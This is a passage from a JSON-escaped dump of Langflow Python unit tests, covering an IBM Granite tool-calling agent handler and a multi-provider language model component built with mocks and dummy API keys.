[Mock(name=\\\"tool1\\\")]\\n        mock_prompt = Mock()\\n\\n        create_granite_agent(mock_llm, mock_tools, mock_prompt)\\n\\n        calls = mock_llm.bind_tools.call_args_list\\n        tool_choices = [call[1].get(\\\"tool_choice\\\") for call in calls]\\n        assert \\\"required\\\" in tool_choices\\n\\n    def test_bind_tools_called_with_auto(self):\\n        \\\"\\\"\\\"Test that bind_tools is called with tool_choice='auto'.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n        mock_tools = [Mock(name=\\\"tool1\\\")]\\n        mock_prompt = Mock()\\n\\n        create_granite_agent(mock_llm, mock_tools, mock_prompt)\\n\\n        calls = mock_llm.bind_tools.call_args_list\\n        tool_choices = [call[1].get(\\\"tool_choice\\\") for call in calls]\\n        assert \\\"auto\\\" in tool_choices\\n\\n    def test_empty_tools_list(self):\\n        \\\"\\\"\\\"Test agent creation with empty tools list.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n        mock_prompt = Mock()\\n\\n        agent = create_granite_agent(mock_llm, [], mock_prompt)\\n\\n        assert agent is not None\\n\\n    def test_custom_forced_iterations(self):\\n        \\\"\\\"\\\"Test agent creation with custom forced_iterations.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n        mock_tools = [Mock(name=\\\"tool1\\\")]\\n        mock_prompt = Mock()\\n\\n        agent = create_granite_agent(mock_llm, mock_tools, mock_prompt, forced_iterations=5)\\n\\n        assert agent is not None\\n\\n\\nclass TestCreateGraniteAgentDynamicInvoke:\\n    \\\"\\\"\\\"Test suite for the dynamic_invoke inner function in create_granite_agent.\\\"\\\"\\\"\\n\\n    def setup_method(self):\\n        \\\"\\\"\\\"Set up common mocks for each test.\\\"\\\"\\\"\\n        self.mock_llm = Mock()\\n        self.mock_llm_required = Mock()\\n        self.mock_llm_auto = Mock()\\n\\n        def bind_tools_side_effect(_tools, tool_choice=None):\\n            if tool_choice == \\\"required\\\":\\n                return self.mock_llm_required\\n            return self.mock_llm_auto\\n\\n        self.mock_llm.bind_tools = Mock(side_effect=bind_tools_side_effect)\\n\\n        self.mock_prompt = Mock()\\n        self.mock_prompt.invoke = Mock(return_value=Mock(messages=[]))\\n\\n        self.mock_tools = [Mock(name=\\\"tool1\\\")]\\n\\n    def test_uses_required_for_first_iteration(self):\\n        \\\"\\\"\\\"Test that tool_choice='required' is used for first iteration.\\\"\\\"\\\"\\n        self.mock_llm_required.invoke = Mock(return_value=AIMessage(content=\\\"response\\\"))\\n\\n        agent = create_granite_agent(self.mock_llm, self.mock_tools, self.mock_prompt)\\n\\n        # Invoke with no intermediate steps (first iteration)\\n        inputs = {\\\"input\\\": \\\"test\\\", \\\"intermediate_steps\\\": []}\\n\\n        # The agent is a RunnableLambda | ToolsAgentOutputParser chain\\n        # We need to invoke the first part (RunnableLambda)\\n        # This will raise because ToolsAgentOutputParser expects AIMessage with tool_calls\\n        with (\\n            patch(\\\"lfx.components.langchain_utilities.ibm_granite_handler.format_to_tool_messages\\\", return_value=[]),\\n            contextlib.suppress(Exception),\\n        ):\\n            agent.invoke(inputs)\\n\\n        self.mock_llm_required.invoke.assert_called()\\n\\n    def test_uses_auto_after_forced_iterations(self):\\n        \\\"\\\"\\\"Test that tool_choice='auto' is used after forced iterations.\\\"\\\"\\\"\\n        self.mock_llm_auto.invoke = Mock(return_value=AIMessage(content=\\\"final response\\\"))\\n\\n        agent = create_granite_agent(self.mock_llm, self.mock_tools, self.mock_prompt, forced_iterations=2)\\n\\n        # Invoke with 2 intermediate steps (past forced iterations)\\n        inputs = {\\\"input\\\": \\\"test\\\", \\\"intermediate_steps\\\": [(\\\"action1\\\", \\\"result1\\\"), (\\\"action2\\\", \\\"result2\\\")]}\\n\\n        with (\\n            patch(\\\"lfx.components.langchain_utilities.ibm_granite_handler.format_to_tool_messages\\\", return_value=[]),\\n            contextlib.suppress(Exception),\\n        ):\\n            agent.invoke(inputs)\\n\\n        self.mock_llm_auto.invoke.assert_called()\\n\\n    def test_placeholder_detection_triggers_corrective_message(self):\\n        \\\"\\\"\\\"Test that placeholder detection triggers corrective message.\\\"\\\"\\\"\\n        # Create response with placeholder in tool calls\\n        mock_response = Mock()\\n        mock_response.tool_calls = [{\\\"name\\\": \\\"calculator\\\", \\\"args\\\": {\\\"expression\\\": \\\"<result-from-search>\\\"}}]\\n        self.mock_llm_required.invoke = Mock(return_value=mock_response)\\n        self.mock_llm_auto.invoke = Mock(return_value=AIMessage(content=\\\"corrected response\\\"))\\n\\n        agent = create_granite_agent(self.mock_llm, self.mock_tools, self.mock_prompt)\\n\\n        inputs = {\\\"input\\\": \\\"test\\\", \\\"intermediate_steps\\\": []}\\n\\n        with (\\n            patch(\\\"lfx.components.langchain_utilities.ibm_granite_handler.format_to_tool_messages\\\", return_value=[]),\\n            contextlib.suppress(Exception),\\n        ):\\n            agent.invoke(inputs)\\n\\n        # After placeholder detection, llm_auto should be called with corrective message\\n        assert self.mock_llm_auto.invoke.called\\n\\n\\n# =============================================================================\\n# Integration tests with ToolCallingAgentComponent\\n# =============================================================================\\n\\n\\nclass TestToolCallingAgentIntegration:\\n    \\\"\\\"\\\"Integration tests for ToolCallingAgentComponent with IBM WatsonX.\\\"\\\"\\\"\\n\\n    def test_watsonx_detection_in_create_agent_runnable(self):\\n        \\\"\\\"\\\"Test that WatsonX models are detected in create_agent_runnable.\\\"\\\"\\\"\\n        from lfx.components.langchain_utilities import ToolCallingAgentComponent\\n\\n        # Create a mock WatsonX LLM (simulating ChatWatsonx)\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n        mock_llm.model_id = \\\"ibm/granite-13b-chat-v2\\\"\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n\\n        mock_tools = [create_mock_tool(\\\"test_tool\\\"), create_mock_tool(\\\"test_tool2\\\")]\\n\\n        component = ToolCallingAgentComponent()\\n        component.tools = mock_tools\\n        component.system_prompt = \\\"Test prompt\\\"\\n\\n        with (\\n            patch.object(component, \\\"_get_llm\\\", return_value=mock_llm),\\n            patch(\\\"lfx.components.langchain_utilities.tool_calling.create_granite_agent\\\") as mock_create,\\n        ):\\n            mock_create.return_value = Mock()\\n\\n            component.create_agent_runnable()\\n\\n            # Verify create_granite_agent was called (for WatsonX models)\\n            mock_create.assert_called_once()\\n\\n    def test_watsonx_llama_uses_default_agent(self):\\n        \\\"\\\"\\\"Test that Llama model on WatsonX uses default agent (not Granite-specific).\\\"\\\"\\\"\\n        from lfx.components.langchain_utilities import ToolCallingAgentComponent\\n\\n        # Create a mock WatsonX LLM with Llama model (non-Granite)\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n        mock_llm.model_id = \\\"meta-llama/llama-3-2-11b-vision\\\"\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n\\n        mock_tools = [create_mock_tool(\\\"tool1\\\"), create_mock_tool(\\\"tool2\\\")]\\n\\n        component = ToolCallingAgentComponent()\\n        component.tools = mock_tools\\n        component.system_prompt = \\\"Test prompt\\\"\\n\\n        with (\\n            patch.object(component, \\\"_get_llm\\\", return_value=mock_llm),\\n            patch(\\\"lfx.components.langchain_utilities.tool_calling.create_tool_calling_agent\\\") as mock_default,\\n        ):\\n            mock_default.return_value = Mock()\\n\\n            component.create_agent_runnable()\\n\\n            # Verify create_tool_calling_agent was called (default behavior for non-Granite)\\n            mock_default.assert_called_once()\\n\\n    def test_non_watsonx_uses_default_agent(self):\\n        \\\"\\\"\\\"Test that non-WatsonX models use the default agent creation.\\\"\\\"\\\"\\n        from lfx.components.langchain_utilities import ToolCallingAgentComponent\\n\\n        # Create a mock non-WatsonX LLM (e.g., OpenAI)\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatOpenAI\\\"\\n        mock_llm.__class__.__module__ = \\\"langchain_openai\\\"\\n        mock_llm.model_id = \\\"gpt-4\\\"\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n\\n        mock_tools = [create_mock_tool(\\\"test_tool\\\")]\\n\\n        component = ToolCallingAgentComponent()\\n        component.tools = mock_tools\\n        component.system_prompt = \\\"Test prompt\\\"\\n\\n        with (\\n            patch.object(component, \\\"_get_llm\\\", return_value=mock_llm),\\n            patch(\\\"lfx.components.langchain_utilities.tool_calling.create_tool_calling_agent\\\") as mock_create,\\n        ):\\n            mock_create.return_value = Mock()\\n\\n            component.create_agent_runnable()\\n\\n            # Verify create_tool_calling_agent was called\\n            mock_create.assert_called_once()\\n\\n    def test_system_prompt_enhanced_for_watsonx(self):\\n        \\\"\\\"\\\"Test that system prompt is enhanced for WatsonX models.\\\"\\\"\\\"\\n        from lfx.components.langchain_utilities import ToolCallingAgentComponent\\n\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n        mock_llm.model_id = \\\"ibm/granite-13b-chat-v2\\\"\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n\\n        mock_tools = [create_mock_tool(\\\"tool1\\\"), create_mock_tool(\\\"tool2\\\")]\\n\\n        component = ToolCallingAgentComponent()\\n        component.tools = mock_tools\\n        component.system_prompt = \\\"Original prompt\\\"\\n\\n        with (\\n            patch.object(component, \\\"_get_llm\\\", return_value=mock_llm),\\n            patch(\\\"lfx.components.langchain_utilities.tool_calling.create_granite_agent\\\") as mock_create,\\n        ):\\n            mock_create.return_value = Mock()\\n\\n            component.create_agent_runnable()\\n\\n            # Verify enhanced prompt is stored separately (original is not mutated)\\n            assert component.system_prompt == \\\"Original prompt\\\"\\n            assert hasattr(component, \\\"_effective_system_prompt\\\")\\n            assert \\\"TOOL USAGE GUIDELINES\\\" in component._effective_system_prompt\\n\\n    def test_system_prompt_not_enhanced_without_tools(self):\\n        \\\"\\\"\\\"Test that system prompt is not enhanced when no tools.\\\"\\\"\\\"\\n        from lfx.components.langchain_utilities import ToolCallingAgentComponent\\n\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n        mock_llm.model_id = \\\"ibm/granite-13b-chat-v2\\\"\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n\\n        component = ToolCallingAgentComponent()\\n        component.tools = []\\n        component.system_prompt = \\\"Original prompt\\\"\\n\\n        with (\\n            patch.object(component, \\\"_get_llm\\\", return_value=mock_llm),\\n            patch(\\\"lfx.components.langchain_utilities.tool_calling.create_tool_calling_agent\\\") as mock_create,\\n        ):\\n            mock_create.return_value = Mock()\\n\\n            component.create_agent_runnable()\\n\\n            # Verify system prompt was NOT enhanced (no _effective_system_prompt set)\\n            assert component.system_prompt == \\\"Original prompt\\\"\\n            assert not hasattr(component, \\\"_effective_system_prompt\\\")\\n\\n\\n# =============================================================================\\n# Edge case and error handling tests\\n# =============================================================================\\n\\n\\nclass TestEdgeCases:\\n    \\\"\\\"\\\"Test edge cases and error handling.\\\"\\\"\\\"\\n\\n    def test_is_granite_model_with_integer_model_id(self):\\n        \\\"\\\"\\\"Test handling of non-string model_id.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = 12345\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_detect_placeholder_with_special_characters(self):\\n        \\\"\\\"\\\"Test placeholder detection with special regex characters.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"value\\\": \\\"<result-from-search.+*?>\\\"}}]\\n\\n        # Should not raise regex error\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_get_enhanced_system_prompt_preserves_base(self):\\n        \\\"\\\"\\\"Test that base prompt is always preserved.\\\"\\\"\\\"\\n        base_prompt = \\\"Very important system instructions that must be kept.\\\"\\n        mock_tools = [create_mock_tool(\\\"t1\\\"), create_mock_tool(\\\"t2\\\")]\\n\\n        result = get_enhanced_system_prompt(base_prompt, mock_tools)\\n\\n        assert result.startswith(base_prompt)\\n\\n    def test_create_granite_agent_with_none_tools(self):\\n        \\\"\\\"\\\"Test agent creation when tools is None.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n        mock_prompt = Mock()\\n\\n        # Should handle None tools gracefully\\n        agent = create_granite_agent(mock_llm, None, mock_prompt)\\n\\n        assert agent is not None\\n\\n    def test_placeholder_in_numeric_value(self):\\n        \\\"\\\"\\\"Test that numeric values don't trigger placeholder detection.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"calculator\\\", \\\"args\\\": {\\\"value\\\": 12345}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n\\n    def test_placeholder_in_list_value(self):\\n        \\\"\\\"\\\"Test handling of list values in args.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"items\\\": [\\\"<result>\\\", \\\"normal\\\"]}}]\\n\\n        # Current implementation doesn't check list items\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n\\n    def test_is_granite_with_watsonx_model_id(self):\\n        \\\"\\\"\\\"Test detection with full WatsonX model ID format.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"ibm/granite-3-8b-instruct\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_empty_args_dict(self):\\n        \\\"\\\"\\\"Test with empty args dictionary.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_language_model_component.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"486b35e28b9ffe2599ab1dfe1153c57e6238ceed9aeb9ce56dd801fdbac0fa5d\",\"content\":\"import os\\nfrom unittest.mock import MagicMock, patch\\n\\nimport pytest\\nfrom langchain_anthropic import ChatAnthropic\\nfrom langchain_openai import ChatOpenAI\\nfrom lfx.base.models.anthropic_constants import ANTHROPIC_MODELS\\nfrom lfx.base.models.google_generative_ai_constants import GOOGLE_GENERATIVE_AI_MODELS\\nfrom lfx.base.models.openai_constants import OPENAI_REASONING_MODEL_NAMES\\nfrom lfx.components.models_and_agents import LanguageModelComponent\\n\\nfrom tests.base import ComponentTestBaseWithoutClient\\n\\n\\nclass TestLanguageModelComponent(ComponentTestBaseWithoutClient):\\n    @pytest.fixture\\n    def component_class(self):\\n        return LanguageModelComponent\\n\\n    @pytest.fixture\\n    def default_kwargs(self):\\n        return {\\n            \\\"model\\\": [\\n                {\\n                    \\\"name\\\": \\\"gpt-3.5-turbo\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"context_length\\\": 128000,\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                        \\\"reasoning_models\\\": OPENAI_REASONING_MODEL_NAMES,\\n                    },\\n                }\\n            ],\\n            \\\"api_key\\\": \\\"test-api-key\\\",\\n            \\\"temperature\\\": 0.1,\\n            \\\"system_message\\\": \\\"You are a helpful assistant.\\\",\\n            \\\"input_value\\\": \\\"Hello, how are you?\\\",\\n            \\\"stream\\\": False,\\n        }\\n\\n    @pytest.fixture\\n    def file_names_mapping(self):\\n        \\\"\\\"\\\"Return the file names mapping for version-specific files.\\\"\\\"\\\"\\n        # No version-specific files for this component\\n        return []\\n\\n    @pytest.fixture\\n    def openai_api_key(self):\\n        \\\"\\\"\\\"Fixture to get OpenAI API key from environment variable.\\\"\\\"\\\"\\n        api_key = os.environ.get(\\\"OPENAI_API_KEY\\\")\\n        if not api_key:\\n            pytest.skip(\\\"OPENAI_API_KEY environment variable not set\\\")\\n        return api_key\\n\\n    @pytest.fixture\\n    def anthropic_api_key(self):\\n        \\\"\\\"\\\"Fixture to get Anthropic API key from environment variable.\\\"\\\"\\\"\\n        api_key = os.environ.get(\\\"ANTHROPIC_API_KEY\\\")\\n        if not api_key:\\n            pytest.skip(\\\"ANTHROPIC_API_KEY environment variable not set\\\")\\n        return api_key\\n\\n    @pytest.fixture\\n    def google_api_key(self):\\n        \\\"\\\"\\\"Fixture to get Google API key from environment variable.\\\"\\\"\\\"\\n        api_key = os.environ.get(\\\"GOOGLE_API_KEY\\\")\\n        if not api_key:\\n            pytest.skip(\\\"GOOGLE_API_KEY environment variable not set\\\")\\n        return api_key\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_model_class\\\")\\n    async def test_openai_model_creation(self, mock_get_model_class, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that the component returns an instance of ChatOpenAI for OpenAI provider.\\\"\\\"\\\"\\n        # Setup mock\\n        mock_openai_class = MagicMock()\\n        mock_instance = MagicMock()\\n        mock_instance.model_name = \\\"gpt-3.5-turbo\\\"\\n        mock_instance.temperature = 0.5\\n        mock_instance.streaming = False\\n        mock_openai_class.return_value = mock_instance\\n        mock_get_model_class.return_value = mock_openai_class\\n\\n        # Update default_kwargs to include max_tokens_field_name in metadata\\n        default_kwargs[\\\"model\\\"][0][\\\"metadata\\\"][\\\"max_tokens_field_name\\\"] = \\\"max_tokens\\\"\\n        default_kwargs[\\\"max_tokens\\\"] = 500\\n\\n        component = component_class(**default_kwargs)\\n        component.api_key = \\\"sk-test-key\\\"\\n        component.temperature = 0.5\\n        component.stream = False\\n\\n        model = component.build_model()\\n\\n        # Verify the model class getter was called\\n        mock_get_model_class.assert_called_once_with(\\\"ChatOpenAI\\\")\\n\\n        # Verify the mock was called with max_tokens\\n        assert mock_openai_class.call_count == 1\\n        call_kwargs = mock_openai_class.call_args[1]\\n\\n        assert call_kwargs[\\\"model\\\"] == \\\"gpt-3.5-turbo\\\"\\n        assert call_kwargs[\\\"temperature\\\"] == 0.5\\n        assert not call_kwargs[\\\"streaming\\\"]\\n        assert call_kwargs[\\\"api_key\\\"] == \\\"sk-test-key\\\"\\n        assert \\\"max_tokens\\\" in call_kwargs, \\\"OpenAI should use max_tokens\\\"\\n        assert call_kwargs[\\\"max_tokens\\\"] == 500\\n        assert model == mock_instance\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_model_class\\\")\\n    async def test_anthropic_model_creation(self, mock_get_model_class, component_class):\\n        \\\"\\\"\\\"Test that the component returns an instance of ChatAnthropic for Anthropic provider.\\\"\\\"\\\"\\n        # Setup mock\\n        mock_anthropic_class = MagicMock()\\n        mock_instance = MagicMock()\\n        mock_instance.model = ANTHROPIC_MODELS[0]\\n        mock_instance.temperature = 0.7\\n        mock_instance.streaming = False\\n        mock_anthropic_class.return_value = mock_instance\\n        mock_get_model_class.return_value = mock_anthropic_class\\n\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": ANTHROPIC_MODELS[0],\\n                    \\\"provider\\\": \\\"Anthropic\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"context_length\\\": 200000,\\n                        \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            api_key=\\\"sk-ant-test-key\\\",\\n            temperature=0.7,\\n            stream=False,\\n        )\\n\\n        model = component.build_model()\\n\\n        # Verify the model class getter was called\\n        mock_get_model_class.assert_called_once_with(\\\"ChatAnthropic\\\")\\n\\n        # Verify the mock was called\\n        assert mock_anthropic_class.call_count == 1\\n        call_kwargs = mock_anthropic_class.call_args[1]\\n\\n        assert call_kwargs[\\\"model\\\"] == ANTHROPIC_MODELS[0]\\n        assert call_kwargs[\\\"temperature\\\"] == 0.7\\n        assert not call_kwargs[\\\"streaming\\\"]\\n        assert call_kwargs[\\\"api_key\\\"] == \\\"sk-ant-test-key\\\"\\n        assert model == mock_instance\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_model_class\\\")\\n    async def test_google_model_creation(self, mock_get_model_class, component_class):\\n        \\\"\\\"\\\"Test that the component returns an instance of ChatGoogleGenerativeAI for Google provider.\\\"\\\"\\\"\\n        # Setup mock\\n        mock_google_class = MagicMock()\\n        mock_instance = MagicMock()\\n        mock_google_class.return_value = mock_instance\\n        mock_get_model_class.return_value = mock_google_class\\n\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": GOOGLE_GENERATIVE_AI_MODELS[0],\\n                    \\\"provider\\\": \\\"Google Generative AI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"context_length\\\": 32768,\\n                        \\\"model_class\\\": \\\"ChatGoogleGenerativeAIFixed\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"google_api_key\\\",\\n                        \\\"max_tokens_field_name\\\": \\\"max_output_tokens\\\",\\n                    },\\n                }\\n            ],\\n            api_key=\\\"google-test-key\\\",\\n            temperature=0.7,\\n            stream=False,\\n            max_tokens=1000,\\n        )\\n\\n        model = component.build_model()\\n\\n        # Verify the model class getter was called\\n        mock_get_model_class.assert_called_once_with(\\\"ChatGoogleGenerativeAIFixed\\\")\\n\\n        # Verify the mock was called with max_output_tokens (not max_tokens)\\n        assert mock_google_class.call_count == 1\\n        call_kwargs = mock_google_class.call_args[1]\\n        assert \\\"max_output_tokens\\\" in call_kwargs, \\\"Google should use max_output_tokens\\\"\\n        assert call_kwargs[\\\"max_output_tokens\\\"] == 1000\\n        assert \\\"max_tokens\\\" not in call_kwargs, \\\"max_tokens should not be used for Google\\\"\\n        call_kwargs = mock_google_class.call_args[1]\\n\\n        assert call_kwargs[\\\"model\\\"] == GOOGLE_GENERATIVE_AI_MODELS[0]\\n        assert call_kwargs[\\\"temperature\\\"] == 0.7\\n        assert not call_kwargs[\\\"streaming\\\"]\\n        assert call_kwargs[\\\"google_api_key\\\"] == \\\"google-test-key\\\"\\n        assert model == mock_instance\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_api_key_for_provider\\\", return_value=None)\\n    async def test_build_model_openai_missing_api_key(self, mock_get_api_key, component_class, default_kwargs):  # noqa: ARG002\\n        component = component_class(**default_kwargs)\\n        component.api_key = None\\n\\n        with pytest.raises(ValueError, match=\\\"OpenAI API key is required when using OpenAI provider\\\"):\\n            component.build_model()\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_api_key_for_provider\\\", return_value=None)\\n    async def test_build_model_anthropic_missing_api_key(self, mock_get_api_key, component_class):  # noqa: ARG002\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": ANTHROPIC_MODELS[0],\\n                    \\\"provider\\\": \\\"Anthropic\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            api_key=None,\\n        )\\n\\n        with pytest.raises(ValueError, match=\\\"Anthropic API key is required when using Anthropic provider\\\"):\\n            component.build_model()\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_api_key_for_provider\\\", return_value=None)\\n    async def test_build_model_google_missing_api_key(self, mock_get_api_key, component_class):  # noqa: ARG002\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": GOOGLE_GENERATIVE_AI_MODELS[0],\\n                    \\\"provider\\\": \\\"Google\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatGoogleGenerativeAIFixed\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"google_api_key\\\",\\n                    },\\n                }\\n            ],\\n            api_key=None,\\n        )\\n\\n        with pytest.raises(ValueError, match=\\\"Google API key is required when using Google provider\\\"):\\n            component.build_model()\\n\\n    async def test_build_model_no_model_selection(self, component_class):\\n        component = component_class(\\n            model=[],\\n            api_key=\\\"test-key\\\",\\n        )\\n\\n        with pytest.raises(ValueError, match=\\\"A model selection is required\\\"):\\n            component.build_model()\\n\\n    async def test_build_model_no_model_class(self, component_class):\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"test-model\\\",\\n                    \\\"provider\\\": \\\"Test\\\",\\n                    \\\"metadata\\\": {\\n                        # No model_class defined\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            api_key=\\\"test-key\\\",\\n        )\\n\\n        with pytest.raises(ValueError, match=\\\"No model class defined for test-model\\\"):\\n            component.build_model()\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_model_class\\\")\\n    async def test_reasoning_model_no_temperature(self, mock_get_model_class, component_class):\\n        \\\"\\\"\\\"Test that reasoning models don't include temperature parameter.\\\"\\\"\\\"\\n        # Setup mock\\n        mock_openai_class = MagicMock()\\n        mock_instance = MagicMock()\\n        mock_openai_class.return_value = mock_instance\\n        mock_get_model_class.return_value = mock_openai_class\\n\\n        # Use a reasoning model\\n        reasoning_model = OPENAI_REASONING_MODEL_NAMES[0] if OPENAI_REASONING_MODEL_NAMES else \\\"o1-preview\\\"\\n\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": reasoning_model,\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                        \\\"reasoning_models\\\": OPENAI_REASONING_MODEL_NAMES,\\n                    },\\n                }\\n            ],\\n            api_key=\\\"sk-test-key\\\",\\n            temperature=0.5,  # This should be ignored\\n            stream=False,\\n        )\\n\\n        _ = component.build_model()\\n\\n        # Verify the mock was called\\n        assert mock_openai_class.call_count == 1\\n        call_kwargs = mock_openai_class.call_args[1]\\n\\n        # Temperature should NOT be in kwargs for reasoning models\\n        assert \\\"temperature\\\" not in call_kwargs\\n        assert call_kwargs[\\\"model\\\"] == reasoning_model\\n        assert not call_kwargs[\\\"streaming\\\"]\\n        assert call_kwargs[\\\"api_key\\\"] == \\\"sk-test-key\\\"\\n\\n    async def test_openai_live_api(self, component_class, default_kwargs, openai_api_key):\\n        \\\"\\\"\\\"Test that the component can create a model with a real API key.\\\"\\\"\\\"\\n        component = component_class(**default_kwargs)\\n        component.api_key = openai_api_key\\n        component.temperature = 0.1\\n        component.stream = False\\n\\n        model = component.build_model()\\n        assert isinstance(model, ChatOpenAI)\\n\\n    async def test_anthropic_live_api(self, component_class, anthropic_api_key):\\n        \\\"\\\"\\\"Test that the component can create a model with a real API key.\\\"\\\"\\\"\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": ANTHROPIC_MODELS[0],\\n                    \\\"provider\\\": \\\"Anthropic\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"context_length\\\": 200000,\\n                        \\\"model_class\\\": \\\"ChatAnthropic\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"api_key\\\",\\n                    },\\n                }\\n            ],\\n            api_key=anthropic_api_key,\\n            temperature=0.1,\\n            stream=False,\\n        )\\n\\n        model = component.build_model()\\n        assert isinstance(model, ChatAnthropic)\\n\\n    async def test_google_live_api(self, component_class, google_api_key):\\n        \\\"\\\"\\\"Test that the component can create a model with a real API key.\\\"\\\"\\\"\\n        chat_google_generative_ai = pytest.importorskip(\\\"langchain_google_genai\\\").ChatGoogleGenerativeAI\\n\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": GOOGLE_GENERATIVE_AI_MODELS[0],\\n                    \\\"provider\\\": \\\"Google\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"context_length\\\": 32768,\\n                        \\\"model_class\\\": \\\"ChatGoogleGenerativeAIFixed\\\",\\n                        \\\"model_name_param\\\": \\\"model\\\",\\n                        \\\"api_key_param\\\": \\\"google_api_key\\\",\\n                    },\\n                }\\n            ],\\n            api_key=google_api_key,\\n            temperature=0.1,\\n            stream=False,\\n        )\\n\\n        model = component.build_model()\\n        assert isinstance(model, chat_google_generative_ai)\\n\\n    # ---------------------------------------------------------------------------\\n    # update_build_config field-visibility tests (#2 + #5)\\n    # ---------------------------------------------------------------------------\\n\\n    def _get_build_config(self, component):\\n        \\\"\\\"\\\"Helper to get a fresh build_config dict from the component's frontend node.\\\"\\\"\\\"\\n        return component.to_frontend_node()[\\\"data\\\"][\\\"node\\\"][\\\"template\\\"]\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_language_model_options\\\")\\n    async def test_update_build_config_shows_ollama_url_when_ollama_selected(\\n        self, mock_opts, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Selecting Ollama shows ollama_base_url and hides WatsonX-specific fields.\\\"\\\"\\\"\\n        ollama_model = [{\\\"name\\\": \\\"llama3.2\\\", \\\"provider\\\": \\\"Ollama\\\", \\\"metadata\\\": {}}]\\n        mock_opts.return_value = ollama_model\\n        component = component_class(**default_kwargs)\\n        component._user_id = None\\n\\n        build_config = self._get_build_config(component)\\n\\n        updated = component.update_build_config(build_config, ollama_model, 